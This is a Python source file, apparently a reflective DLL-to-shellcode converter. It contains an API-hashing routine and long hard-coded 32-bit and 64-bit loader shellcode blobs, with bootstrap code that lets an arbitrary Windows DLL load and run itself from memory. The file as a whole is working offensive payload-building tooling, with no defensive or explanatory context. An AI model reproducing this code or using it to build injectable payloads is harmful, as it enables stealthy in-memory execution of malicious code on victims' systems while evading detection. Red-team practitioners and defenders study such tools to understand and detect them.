import sys
import pefile
from struct import pack
def is64BitDLL(bytes):
    pe =  pefile.PE(data=bytes, fast_load=True)
    return (pe.OPTIONAL_HEADER.Magic == 0x20b)
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
def HashFunctionName(name, module = None):
        function = name.encode('UTF-16LE') + b'\x00'
        if(module):
                module = module.upper().encode('UTF-16LE') + b'\x00\x00'
                functionHash = 0
                for b in function:
                        functionHash = ror(functionHash, 13, 32)
                        functionHash += b
                moduleHash = 0
                for b in module:
                        moduleHash = ror(moduleHash, 13, 32)
                        moduleHash += b
                functionHash += moduleHash
                if functionHash > 0xFFFFFFFF: functionHash -= 0x100000000
        else:
                functionHash = 0
                for b in function:
                        functionHash = ror(functionHash, 13, 32)
                        functionHash += b
        return functionHash
def ConvertToShellcode(dllBytes, functionHash=0x10, userData=b'None', flags=0):
    rdiShellcode32 = b"\x83\xEC\x48\x83\x64\x24\x18\x00\xB9\x4C\x77\x26\x07\x53\x55\x56\x57\x33\xF6\xE8\x22\x04\x00\x00\xB9\x49\xF7\x02\x78\x89\x44\x24\x1C\xE8\x14\x04\x00\x00\xB9\x58\xA4\x53\xE5\x89\x44\x24\x20\xE8\x06\x04\x00\x00\xB9\x10\xE1\x8A\xC3\x8B\xE8\xE8\xFA\x03\x00\x00\xB9\xAF\xB1\x5C\x94\x89\x44\x24\x2C\xE8\xEC\x03\x00\x00\xB9\x33\x00\x9E\x95\x89\x44\x24\x30\xE8\xDE\x03\x00\x00\x8B\xD8\x8B\x44\x24\x5C\x8B\x78\x3C\x03\xF8\x89\x7C\x24\x10\x81\x3F\x50\x45\x00\x00\x74\x07\x33\xC0\xE9\xB8\x03\x00\x00\xB8\x4C\x01\x00\x00\x66\x39\x47\x04\x75\xEE\xF6\x47\x38\x01\x75\xE8\x0F\xB7\x57\x06\x0F\xB7\x47\x14\x85\xD2\x74\x22\x8D\x4F\x24\x03\xC8\x83\x79\x04\x00\x8B\x01\x75\x05\x03\x47\x38\xEB\x03\x03\x41\x04\x3B\xC6\x0F\x47\xF0\x83\xC1\x28\x83\xEA\x01\x75\xE3\x8D\x44\x24\x34\x50\xFF\xD3\x8B\x44\x24\x38\x8B\x5F\x50\x8D\x50\xFF\x8D\x48\xFF\xF7\xD2\x48\x03\xCE\x03\xC3\x23\xCA\x23\xC2\x3B\xC1\x75\x97\x6A\x04\x68\x00\x30\x00\x00\x53\x6A\x00\xFF\xD5\x8B\x77\x54\x8B\xD8\x8B\x44\x24\x5C\x33\xC9\x89\x44\x24\x14\x8B\xD3\x33\xC0\x89\x5C\x24\x18\x40\x89\x44\x24\x24\x85\xF6\x74\x37\x8B\x6C\x24\x6C\x8B\x5C\x24\x14\x23\xE8\x4E\x85\xED\x74\x19\x8B\xC7\x2B\x44\x24\x5C\x3B\xC8\x73\x0F\x83\xF9\x3C\x72\x05\x83\xF9\x3E\x76\x05\xC6\x02\x00\xEB\x04\x8A\x03\x88\x02\x41\x43\x42\x85\xF6\x75\xD7\x8B\x5C\x24\x18\x0F\xB7\x47\x06\x0F\xB7\x4F\x14\x85\xC0\x74\x38\x83\xC7\x2C\x03\xCF\x8B\x7C\x24\x5C\x8B\x51\xF8\x48\x8B\x31\x03\xD3\x8B\x69\xFC\x03\xF7\x89\x44\x24\x5C\x85\xED\x74\x0F\x8A\x06\x88\x02\x42\x46\x83\xED\x01\x75\xF5\x8B\x44\x24\x5C\x83\xC1\x28\x85\xC0\x75\xD5\x8B\x7C\x24\x10\x8B\xB7\x80\x00\x00\x00\x03\xF3\x89\x74\x24\x14\x8B\x46\x0C\x85\xC0\x74\x7D\x03\xC3\x50\xFF\x54\x24\x20\x8B\x6E\x10\x8B\xF8\x8B\x06\x03\xEB\x03\xC3\x89\x44\x24\x5C\x83\x7D\x00\x00\x74\x4F\x8B\x74\x24\x20\x8B\x08\x85\xC9\x74\x1E\x79\x1C\x8B\x47\x3C\x0F\xB7\xC9\x8B\x44\x38\x78\x2B\x4C\x38\x10\x8B\x44\x38\x1C\x8D\x04\x88\x8B\x04\x38\x03\xC7\xEB\x0C\x8B\x45\x00\x83\xC0\x02\x03\xC3\x50\x57\xFF\xD6\x89\x45\x00\x83\xC5\x04\x8B\x44\x24\x5C\x83\xC0\x04\x89\x44\x24\x5C\x83\x7D\x00\x00\x75\xB9\x8B\x74\x24\x14\x8B\x46\x20\x83\xC6\x14\x89\x74\x24\x14\x85\xC0\x75\x87\x8B\x7C\x24\x10\x8B\xEB\x2B\x6F\x34\x83\xBF\xA4\x00\x00\x00\x00\x0F\x84\xAA\x00\x00\x00\x8B\x97\xA0\x00\x00\x00\x03\xD3\x89\x54\x24\x5C\x8D\x4A\x04\x8B\x01\x89\x4C\x24\x14\x85\xC0\x0F\x84\x8D\x00\x00\x00\x8B\x32\x8D\x78\xF8\x03\xF3\x8D\x42\x08\xD1\xEF\x89\x44\x24\x20\x74\x60\x6A\x02\x8B\xD8\x5A\x0F\xB7\x0B\x4F\x66\x8B\xC1\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x74\x06\x66\x83\xF8\x03\x75\x0B\x81\xE1\xFF\x0F\x00\x00\x01\x2C\x31\xEB\x27\x66\x3B\x44\x24\x24\x75\x11\x81\xE1\xFF\x0F\x00\x00\x8B\xC5\xC1\xE8\x10\x66\x01\x04\x31\xEB\x0F\x66\x3B\xC2\x75\x0A\x81\xE1\xFF\x0F\x00\x00\x66\x01\x2C\x31\x03\xDA\x85\xFF\x75\xB1\x8B\x5C\x24\x18\x8B\x54\x24\x5C\x8B\x4C\x24\x14\x03\x11\x89\x54\x24\x5C\x8D\x4A\x04\x8B\x01\x89\x4C\x24\x14\x85\xC0\x0F\x85\x77\xFF\xFF\xFF\x8B\x7C\x24\x10\x0F\xB7\x47\x06\x0F\xB7\x4F\x14\x85\xC0\x0F\x84\xB7\x00\x00\x00\x8B\x74\x24\x5C\x8D\x6F\x3C\x03\xE9\x48\x83\x7D\xEC\x00\x89\x44\x24\x24\x0F\x86\x94\x00\x00\x00\x8B\x4D\x00\x33\xD2\x42\x8B\xC1\xC1\xE8\x1D\x23\xC2\x8B\xD1\xC1\xEA\x1E\x83\xE2\x01\xC1\xE9\x1F\x85\xC0\x75\x18\x85\xD2\x75\x07\x6A\x08\x5E\x6A\x01\xEB\x05\x6A\x04\x5E\x6A\x02\x85\xC9\x58\x0F\x44\xF0\xEB\x2C\x85\xD2\x75\x17\x85\xC9\x75\x04\x6A\x10\xEB\x15\x85\xD2\x75\x0B\x85\xC9\x74\x18\xBE\x80\x00\x00\x00\xEB\x11\x85\xC9\x75\x05\x6A\x20\x5E\xEB\x08\x6A\x40\x85\xC9\x58\x0F\x45\xF0\x8B\x4D\x00\x8B\xC6\x0D\x00\x02\x00\x00\x81\xE1\x00\x00\x00\x04\x0F\x44\xC6\x8B\xF0\x8D\x44\x24\x28\x50\x8B\x45\xE8\x56\xFF\x75\xEC\x03\xC3\x50\xFF\x54\x24\x3C\x85\xC0\x0F\x84\xEC\xFC\xFF\xFF\x8B\x44\x24\x24\x83\xC5\x28\x85\xC0\x0F\x85\x52\xFF\xFF\xFF\x8B\x77\x28\x6A\x00\x6A\x00\x6A\xFF\x03\xF3\xFF\x54\x24\x3C\x33\xC0\x40\x50\x50\x53\xFF\xD6\x83\x7C\x24\x60\x00\x74\x7C\x83\x7F\x7C\x00\x74\x76\x8B\x4F\x78\x03\xCB\x8B\x41\x18\x85\xC0\x74\x6A\x83\x79\x14\x00\x74\x64\x8B\x69\x20\x8B\x79\x24\x03\xEB\x83\x64\x24\x5C\x00\x03\xFB\x85\xC0\x74\x51\x8B\x75\x00\x03\xF3\x33\xD2\x0F\xBE\x06\xC1\xCA\x0D\x03\xD0\x46\x80\x7E\xFF\x00\x75\xF1\x39\x54\x24\x60\x74\x16\x8B\x44\x24\x5C\x83\xC5\x04\x40\x83\xC7\x02\x89\x44\x24\x5C\x3B\x41\x18\x72\xD0\xEB\x1F\x0F\xB7\x17\x83\xFA\xFF\x74\x17\x8B\x41\x1C\xFF\x74\x24\x68\xFF\x74\x24\x68\x8D\x04\x90\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\xC3\x5F\x5E\x5D\x5B\x83\xC4\x48\xC3\x83\xEC\x10\x64\xA1\x30\x00\x00\x00\x53\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x18\x8B\x70\x0C\xE9\x8A\x00\x00\x00\x8B\x46\x30\x33\xC9\x8B\x5E\x2C\x8B\x36\x89\x44\x24\x14\x8B\x42\x3C\x8B\x6C\x10\x78\x89\x6C\x24\x10\x85\xED\x74\x6D\xC1\xEB\x10\x33\xFF\x85\xDB\x74\x1F\x8B\x6C\x24\x14\x8A\x04\x2F\xC1\xC9\x0D\x3C\x61\x0F\xBE\xC0\x7C\x03\x83\xC1\xE0\x03\xC8\x47\x3B\xFB\x72\xE9\x8B\x6C\x24\x10\x8B\x44\x2A\x20\x33\xDB\x8B\x7C\x2A\x18\x03\xC2\x89\x7C\x24\x14\x85\xFF\x74\x31\x8B\x28\x33\xFF\x03\xEA\x83\xC0\x04\x89\x44\x24\x1C\x0F\xBE\x45\x00\xC1\xCF\x0D\x03\xF8\x45\x80\x7D\xFF\x00\x75\xF0\x8D\x04\x0F\x3B\x44\x24\x18\x74\x20\x8B\x44\x24\x1C\x43\x3B\x5C\x24\x14\x72\xCF\x8B\x56\x18\x85\xD2\x0F\x85\x6B\xFF\xFF\xFF\x33\xC0\x5F\x5E\x5D\x5B\x83\xC4\x10\xC3\x8B\x74\x24\x10\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB"
    rdiShellcode64 = b"\x48\x8B\xC4\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x53\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x83\xEC\x78\x83\x60\x08\x00\x48\x8B\xE9\xB9\x4C\x77\x26\x07\x44\x8B\xFA\x33\xDB\xE8\xA4\x04\x00\x00\xB9\x49\xF7\x02\x78\x4C\x8B\xE8\xE8\x97\x04\x00\x00\xB9\x58\xA4\x53\xE5\x48\x89\x44\x24\x20\xE8\x88\x04\x00\x00\xB9\x10\xE1\x8A\xC3\x48\x8B\xF0\xE8\x7B\x04\x00\x00\xB9\xAF\xB1\x5C\x94\x48\x89\x44\x24\x30\xE8\x6C\x04\x00\x00\xB9\x33\x00\x9E\x95\x48\x89\x44\x24\x28\x4C\x8B\xE0\xE8\x5A\x04\x00\x00\x48\x63\x7D\x3C\x4C\x8B\xD0\x48\x03\xFD\x81\x3F\x50\x45\x00\x00\x74\x07\x33\xC0\xE9\x2D\x04\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x75\xEE\x41\xBE\x01\x00\x00\x00\x44\x84\x77\x38\x75\xE2\x0F\xB7\x47\x06\x0F\xB7\x4F\x14\x44\x8B\x4F\x38\x85\xC0\x74\x2C\x48\x8D\x57\x24\x44\x8B\xC0\x48\x03\xD1\x8B\x4A\x04\x85\xC9\x75\x07\x8B\x02\x49\x03\xC1\xEB\x04\x8B\x02\x03\xC1\x48\x3B\xC3\x48\x0F\x47\xD8\x48\x83\xC2\x28\x4D\x2B\xC6\x75\xDE\x48\x8D\x4C\x24\x38\x41\xFF\xD2\x44\x8B\x44\x24\x3C\x44\x8B\x4F\x50\x41\x8D\x40\xFF\xF7\xD0\x41\x8D\x50\xFF\x41\x03\xD1\x49\x8D\x48\xFF\x48\x23\xD0\x48\x03\xCB\x49\x8D\x40\xFF\x48\xF7\xD0\x48\x23\xC8\x48\x3B\xD1\x0F\x85\x6B\xFF\xFF\xFF\x33\xC9\x41\x8B\xD1\x41\xB8\x00\x30\x00\x00\x44\x8D\x49\x04\xFF\xD6\x44\x8B\x47\x54\x33\xD2\x48\x8B\xF0\x4C\x8B\xD5\x48\x8B\xC8\x44\x8D\x5A\x02\x4D\x85\xC0\x74\x3F\x44\x8B\x8C\x24\xE0\x00\x00\x00\x45\x23\xCE\x4D\x2B\xC6\x45\x85\xC9\x74\x19\x48\x8B\xC7\x48\x2B\xC5\x48\x3B\xD0\x73\x0E\x48\x8D\x42\xC4\x49\x3B\xC3\x76\x05\xC6\x01\x00\xEB\x05\x41\x8A\x02\x88\x01\x49\x03\xD6\x4D\x03\xD6\x49\x03\xCE\x4D\x85\xC0\x75\xCC\x44\x0F\xB7\x57\x06\x0F\xB7\x47\x14\x4D\x85\xD2\x74\x38\x48\x8D\x4F\x2C\x48\x03\xC8\x8B\x51\xF8\x4D\x2B\xD6\x44\x8B\x01\x48\x03\xD6\x44\x8B\x49\xFC\x4C\x03\xC5\x4D\x85\xC9\x74\x10\x41\x8A\x00\x4D\x03\xC6\x88\x02\x49\x03\xD6\x4D\x2B\xCE\x75\xF0\x48\x83\xC1\x28\x4D\x85\xD2\x75\xCF\x8B\x9F\x90\x00\x00\x00\x48\x03\xDE\x8B\x43\x0C\x85\xC0\x0F\x84\x8A\x00\x00\x00\x48\x8B\x6C\x24\x20\x8B\xC8\x48\x03\xCE\x41\xFF\xD5\x44\x8B\x3B\x4C\x8B\xE0\x44\x8B\x73\x10\x4C\x03\xFE\x4C\x03\xF6\xEB\x49\x49\x83\x3F\x00\x7D\x29\x49\x63\x44\x24\x3C\x41\x0F\xB7\x17\x42\x8B\x8C\x20\x88\x00\x00\x00\x42\x8B\x44\x21\x10\x42\x8B\x4C\x21\x1C\x48\x2B\xD0\x49\x03\xCC\x8B\x04\x91\x49\x03\xC4\xEB\x0F\x49\x8B\x16\x49\x8B\xCC\x48\x83\xC2\x02\x48\x03\xD6\xFF\xD5\x49\x89\x06\x49\x83\xC6\x08\x49\x83\xC7\x08\x49\x83\x3E\x00\x75\xB1\x8B\x43\x20\x48\x83\xC3\x14\x85\xC0\x75\x8C\x44\x8B\xBC\x24\xC8\x00\x00\x00\x44\x8D\x70\x01\x4C\x8B\x64\x24\x28\x4C\x8B\xCE\x41\xBD\x02\x00\x00\x00\x4C\x2B\x4F\x30\x83\xBF\xB4\x00\x00\x00\x00\x0F\x84\x95\x00\x00\x00\x8B\x97\xB0\x00\x00\x00\x48\x03\xD6\x8B\x42\x04\x85\xC0\x0F\x84\x81\x00\x00\x00\xBB\xFF\x0F\x00\x00\x44\x8B\x02\x4C\x8D\x5A\x08\x44\x8B\xD0\x4C\x03\xC6\x49\x83\xEA\x08\x49\xD1\xEA\x74\x59\x41\x0F\xB7\x0B\x4D\x2B\xD6\x0F\xB7\xC1\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x75\x09\x48\x23\xCB\x4E\x01\x0C\x01\xEB\x34\x66\x83\xF8\x03\x75\x09\x48\x23\xCB\x46\x01\x0C\x01\xEB\x25\x66\x41\x3B\xC6\x75\x11\x48\x23\xCB\x49\x8B\xC1\x48\xC1\xE8\x10\x66\x42\x01\x04\x01\xEB\x0E\x66\x41\x3B\xC5\x75\x08\x48\x23\xCB\x66\x46\x01\x0C\x01\x4D\x03\xDD\x4D\x85\xD2\x75\xA7\x8B\x42\x04\x48\x03\xD0\x8B\x42\x04\x85\xC0\x75\x84\x0F\xB7\x6F\x06\x0F\xB7\x47\x14\x48\x85\xED\x0F\x84\xCF\x00\x00\x00\x8B\x9C\x24\xC0\x00\x00\x00\x4C\x8D\x77\x3C\x4C\x8B\x6C\x24\x30\x4C\x03\xF0\x48\xFF\xCD\x41\x83\x7E\xEC\x00\x0F\x86\x9D\x00\x00\x00\x45\x8B\x06\x41\x8B\xD0\xC1\xEA\x1E\x41\x8B\xC0\x41\x8B\xC8\xC1\xE8\x1D\x83\xE2\x01\xC1\xE9\x1F\x83\xE0\x01\x75\x1E\x85\xD2\x75\x0B\xF7\xD9\x1B\xDB\x83\xE3\x07\xFF\xC3\xEB\x3E\xF7\xD9\xB8\x02\x00\x00\x00\x1B\xDB\x23\xD8\x03\xD8\xEB\x2F\x85\xD2\x75\x18\x85\xC9\x75\x05\x8D\x5A\x10\xEB\x22\x85\xD2\x75\x0B\x85\xC9\x74\x1A\xBB\x80\x00\x00\x00\xEB\x13\x85\xC9\x75\x05\x8D\x59\x20\xEB\x0A\x85\xC9\xB8\x40\x00\x00\x00\x0F\x45\xD8\x41\x8B\x4E\xE8\x4C\x8D\x8C\x24\xC0\x00\x00\x00\x41\x8B\x56\xEC\x8B\xC3\x0F\xBA\xE8\x09\x41\x81\xE0\x00\x00\x00\x04\x0F\x44\xC3\x48\x03\xCE\x44\x8B\xC0\x8B\xD8\x41\xFF\xD5\x85\xC0\x0F\x84\xA1\xFC\xFF\xFF\x49\x83\xC6\x28\x48\x85\xED\x0F\x85\x48\xFF\xFF\xFF\x44\x8D\x6D\x02\x8B\x5F\x28\x45\x33\xC0\x33\xD2\x48\x83\xC9\xFF\x48\x03\xDE\x41\xFF\xD4\xBD\x01\x00\x00\x00\x48\x8B\xCE\x44\x8B\xC5\x8B\xD5\xFF\xD3\x45\x85\xFF\x0F\x84\x97\x00\x00\x00\x83\xBF\x8C\x00\x00\x00\x00\x0F\x84\x8A\x00\x00\x00\x8B\x97\x88\x00\x00\x00\x48\x03\xD6\x44\x8B\x5A\x18\x45\x85\xDB\x74\x78\x83\x7A\x14\x00\x74\x72\x44\x8B\x52\x20\x33\xDB\x44\x8B\x4A\x24\x4C\x03\xD6\x4C\x03\xCE\x45\x85\xDB\x74\x5D\x45\x8B\x02\x4C\x03\xC6\x33\xC9\x41\x0F\xBE\x00\x4C\x03\xC5\xC1\xC9\x0D\x03\xC8\x41\x80\x78\xFF\x00\x75\xED\x44\x3B\xF9\x74\x10\x03\xDD\x49\x83\xC2\x04\x4D\x03\xCD\x41\x3B\xDB\x72\xD2\xEB\x2D\x41\x0F\xB7\x01\x83\xF8\xFF\x74\x24\x8B\x52\x1C\x48\x8B\x8C\x24\xD0\x00\x00\x00\xC1\xE0\x02\x48\x98\x48\x03\xC6\x44\x8B\x04\x02\x8B\x94\x24\xD8\x00\x00\x00\x4C\x03\xC6\x41\xFF\xD0\x48\x8B\xC6\x48\x83\xC4\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\x5B\xC3\xCC\xCC\xCC\x48\x89\x5C\x24\x08\x48\x89\x74\x24\x10\x57\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xF1\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB4\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x33\xD2\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x42\x8B\x9C\x00\x88\x00\x00\x00\x85\xDB\x74\xD4\x48\x8B\x04\x24\x48\xC1\xE8\x10\x44\x0F\xB7\xD0\x45\x85\xD2\x74\x21\x48\x8B\x4C\x24\x08\x45\x8B\xDA\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEB\x01\x75\xE7\x4D\x8D\x14\x18\x33\xC9\x41\x8B\x7A\x20\x49\x03\xF8\x41\x39\x4A\x18\x76\x8F\x8B\x1F\x45\x33\xDB\x49\x03\xD8\x48\x8D\x7F\x04\x0F\xBE\x03\x48\xFF\xC3\x41\xC1\xCB\x0D\x44\x03\xD8\x80\x7B\xFF\x00\x75\xED\x41\x8D\x04\x13\x3B\xC6\x74\x0D\xFF\xC1\x41\x3B\x4A\x18\x72\xD1\xE9\x5B\xFF\xFF\xFF\x41\x8B\x42\x24\x03\xC9\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x74\x24\x28\x48\x83\xC4\x10\x5F\xC3"
    if is64BitDLL(dllBytes):
        rdiShellcode = rdiShellcode64
        bootstrap = b''
        bootstrapSize = 64
        bootstrap += b'\xe8\x00\x00\x00\x00'
        dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode)
        bootstrap += b'\x59'
        bootstrap += b'\x49\x89\xc8'
        bootstrap += b'\x48\x81\xc1'
        bootstrap += pack('I', dllOffset)
        bootstrap += b'\xba'
        bootstrap += pack('I', functionHash)
        bootstrap += b'\x49\x81\xc0'
        userDataLocation = dllOffset + len(dllBytes)
        bootstrap += pack('I', userDataLocation)
        bootstrap += b'\x41\xb9'
        bootstrap += pack('I', len(userData))
        bootstrap += b'\x56'
        bootstrap += b'\x48\x89\xe6'
        bootstrap += b'\x48\x83\xe4\xf0'
        bootstrap += b'\x48\x83\xec'
        bootstrap += b'\x30' # 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment
        bootstrap += b'\xC7\x44\x24'
        bootstrap += b'\x20'
        bootstrap += pack('I', flags)
        bootstrap += b'\xe8'
        bootstrap += pack('b', bootstrapSize - len(bootstrap) - 4) # Skip over the remainder of instructions
        bootstrap += b'\x00\x00\x00'
        bootstrap += b'\x48\x89\xf4'
        bootstrap += b'\x5e'
        bootstrap += b'\xc3'
        return bootstrap + rdiShellcode + dllBytes + userData
    else: # 32 bit
        rdiShellcode = rdiShellcode32
        bootstrap = b''
        bootstrapSize = 45
        bootstrap += b'\xe8\x00\x00\x00\x00'
        dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode)
        bootstrap += b'\x58'
        bootstrap += b'\x89\xc3'
        bootstrap += b'\x05'
        bootstrap += pack('I', dllOffset)
        bootstrap += b'\x81\xc3'
        userDataLocation = dllOffset + len(dllBytes)
        bootstrap += pack('I', userDataLocation)
        bootstrap += b'\x68'
        bootstrap += pack('I', flags)
        bootstrap += b'\x68'
        bootstrap += pack('I', len(userData))
        bootstrap += b'\x53'
        bootstrap += b'\x68'
        bootstrap += pack('I', functionHash)
        bootstrap += b'\x50'
        bootstrap += b'\xe8'
        bootstrap += pack('b', bootstrapSize - len(bootstrap) - 4) # Skip over the remainder of instructions
        bootstrap += b'\x00\x00\x00'
        bootstrap += b'\x83\xc4\x14'
        bootstrap += b'\xc3'
        return bootstrap + rdiShellcode + dllBytes + userData
    return False